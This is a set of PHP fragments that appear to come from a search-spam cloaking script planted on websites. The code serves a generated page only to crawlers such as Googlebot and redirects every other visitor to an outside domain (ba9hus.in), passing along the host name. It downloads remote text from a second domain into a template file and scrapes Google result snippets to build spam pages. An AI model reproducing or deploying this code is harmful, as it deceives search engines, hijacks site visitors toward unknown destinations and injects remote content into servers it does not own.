...
$d = $_SERVER["HTTP_HOST"];
if (!strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot")===false || !strpos($_SERVER["HTTP_USER_AGENT"], "crawler")===false || !strpos($_SERVER["HTTP_USER_AGENT"], "bot")===false || !strpos($_SERVER["HTTP_USER_AGENT"], "yahoo")===false){
echo $page;
}
else
{
	header("Location: http://ba9hus.in/for/888?d=$d");
exit;
}
';
$cachepath="./par";
...
if (sizeof($dir) == 2) {
	$tmp = rand(1,7);
    $file = file_get_contents("http://cleanextelip.zz.mu/$tmp.txt", true);
$file2 = fopen("templates/1.txt", "a");
fwrite($file2,$file);
fclose($file2);
} else {
    echo "";
...
for ($i=0; $i<=$cntpages-1; $i++){
	$setmktBing = "US";
	$lang = "US";
//$pageparse=file_get_contents("http://www.bing.com/search?q=".$keyforparse."&pq=".$keyforparse."&setmkt=$lang-$setmktBing&first=".$i."1");
$pageparse=file_get_contents("https://www.google.com/search?q=".$keyforparse."&num=50&newwindow=1&source=lnt&sa=X");
//$pageparse=file_get_contents("http://www.dogpile.com/search/web?qsi=".$i."1&q=".$keyforparse);
//echo $pageparse;
$matchesparse=array();
$patternparse = "#<span class=\"st\">(.*)</span>#isU";
...
$result=str_replace("</b>", "", $result);
$result=str_replace("<span class=\"f\"><span class=\"nobr\">", "", $result);
return $result;
